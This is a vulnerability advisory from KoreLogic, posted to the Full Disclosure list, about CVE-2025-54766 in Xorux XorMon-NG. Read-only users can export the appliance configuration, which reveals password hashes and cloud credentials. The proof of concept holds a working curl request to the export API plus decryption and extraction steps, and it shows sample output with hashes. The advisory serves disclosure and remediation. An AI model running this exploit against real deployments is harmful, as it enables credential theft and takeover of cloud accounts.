---
title: KL-001-2025-012: Xorux XorMon-NG Read Only User Export Device Configuration Exposing Sensitive Information
url: https://seclists.org/fulldisclosure/2025/Jul/15
source: Full Disclosure
date: 2025-07-29
fetch_date: 2025-10-07T00:09:48.694640
---

# KL-001-2025-012: Xorux XorMon-NG Read Only User Export Device Configuration Exposing Sensitive Information

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](26)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](16)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-012: Xorux XorMon-NG Read Only User Export Device Configuration Exposing Sensitive Information

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 28 Jul 2025 18:38:51 -0500

---

```
KL-001-2025-012: Xorux XorMon-NG Read Only User Export Device Configuration Exposing Sensitive Information

Title: Xorux XorMon-NG Read Only User Export Device Configuration Exposing Sensitive Information
Advisory ID: KL-001-2025-012
Publication Date: 2025-07-28
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-012.txt

1. Vulnerability Details

     Affected Vendor: Xorux
     Affected Product: XorMon-NG
     Affected Version: 1.8 and prior
     Platform: Debian
     CWE Classification: CWE-648: Incorrect Use of Privileged APIs
     CVE ID: CVE-2025-54766

2. Vulnerability Description

     An API endpoint that should be limited to web application
     administrators is hidden from, but accessible by, lower-level
     read only web application users. The endpoint can be used
     to export the appliance configuration, exposing sensitive
     information.

3. Technical Description

     A read-only user can access a web application endpoint by
     which device exports can be downloaded. The device exports
     are in tar.gz.gpg format, and can be extracted to reveal
     sensitive information that a read-only user should not be
     privileged to view. The GPG decryption uses a default of
     "undefined" for symmetric encryption and decryption. These
     files include password hashes for all users within the
     Xormon-NG web application and cloud credentials in clear
     text. An authenticated, read-only attacker could leverage
     this vulnerability to obtain and attempt to crack password
     hashes for more privileged users, including the admin user. An
     attacker could also leverage this vulnerability to gain access
     to cloud infrastructure.

4. Mitigation and Remediation Recommendation

     Xorux released version 1.9.38, which includes a remediation
     for this vulnerability. See https://xormon.com/note190.php.

5. Credit

     This vulnerability was discovered by Jim Becher of KoreLogic,
     Inc.

6. Disclosure Timeline

     2025-07-17 : KoreLogic requests point-of-contact to securely
                  report several vulnerabilities to Xorux.
     2025-07-18 : Vendor provides support () xorux com as the
                  point-of-contact, noting that they do not use PGP.
     2025-07-21 : KoreLogic submits this vulnerability and four
                  additional discoveries to Xorux.
     2025-07-23 : Vendor acknowledges receipt, stating that the issue
                  has been remediated and a new version of the
                  affected product will be available 2025-07-25.
     2025-07-25 : Xorux publishes updated version of the affected
                  product.
     2025-07-28 : KoreLogic public disclosure.

7. Proof of Concept
```

         $ curl -k -H "Content-Type: application/json" -H "Cookie:
connect.sid=s%3AqF6R6oacG-octtP9NlJkYh7KqkVWF6on.pTnLbzxDG7MjijzVV%2FbFbPGv7dP%2FZkdQpEco456VZb0"
'[https://172.31.255.208/api/confporter/v1/export'](https://172.31.255.208/api/confporter/v1/export%26apos); -X POST -d
'{"keys":["hostcfg","users","groups","ldaps"],"password":"undefined"}' -o configuration061025-check-aws.tar.gz.gpg

```
         $ gpg --output configuration061025-check-aws.tar.gz --decrypt configuration061025-check-aws.tar.gz.gpg
         gpg: AES256.CFB encrypted data
         gpg: encrypted with 1 passphrase

         $ gunzip configuration061025-check-aws.tar.gz

         $ tar xvf configuration061025-check-aws.tar
         confporter/
         confporter/admin_groups.csv
         confporter/group_ldap_groups.csv
         confporter/groups.csv
         confporter/hostcfg.csv
         confporter/ldap_groups.csv
         confporter/ldaps.csv
         confporter/package.json
         confporter/users.csv
         confporter/users_groups.csv
         confporter/versions.csv

         $ more confporter/hostcfg.csv
hostcfg_id;label;hw_type;disabled;target;ignore_health_status;ignore_health_status_reason;data;createdAt;updatedAt
dc4547c2-1dc8-4ec1-a29e-29c36169e55f;testaws;aws;false;false;true;ccccc;{"host":"aws.amazon.com","port":null,"created":1749563055535,"regions":[""],"updated":null,"disabled":false,"interval":300,"description":"testaws","available_regions":[""],"aws_access_key_id":"AAAAAAAAAAAAAAAAA","aws_secret_access_key":"BBBBBBBBBBBBBBBBBBBBBBBBBBBBB"};2025-06-10T13:44:15.891Z;2025-06-10T13:44:15.891Z;

         $ more confporter/users.csv
user_id;username;email;password;active;locked;failed_login_attempts;readonly;ldap_id;timezone;created;updated;logged;configuration
1;xormon;;$2b$10$GTliGfYOL7cUmvLpd6qTB.6x8UNTymyHrvLTncLoBmM/7Y5p4WsXi;true;false;0;false;;Etc/UTC;2025-06-09T20:27:52.040Z;2025-06-09T20:28:28.077Z;2025-06-09T20:28:28.051Z;{"showReleaseNotes":true,"searchHistoryLimit":40};
3;adman;adman () adman
com;$2a$10$MvdgLQO60xPZyRIU/rXCeucdZsy4LMyGXCW36IIbrWTmBXNFb5urW;true;false;0;false;;UTC;2025-06-09T20:29:11.811Z;2025-06-09T20:29:11.811Z;;{"searchHistoryLimit":40};
2;jbecher;jbecher () korelogic
com;$2a$10$gfngoltRPRvd0epLQ7YHVOrBDp1MuSvVlxMoOivIC1HwHsXRN1VVK;true;false;0;false;;UTC;2025-06-09T20:28:55.801Z;2025-06-09T20:52:19.347Z;2025-06-09T20:52:19.346Z;{"searchHistoryLimit":40};

The contents of this advisory are copyright(c) 2025
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-15/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](26)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](16)

### Current thread:

* **KL-001-2025-012: Xorux XorMon-NG Read Only User Export Device Configuration Exposing Sensitive Information** *KoreLogic Disclosures via Fulldisclosure (Jul 28)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download]...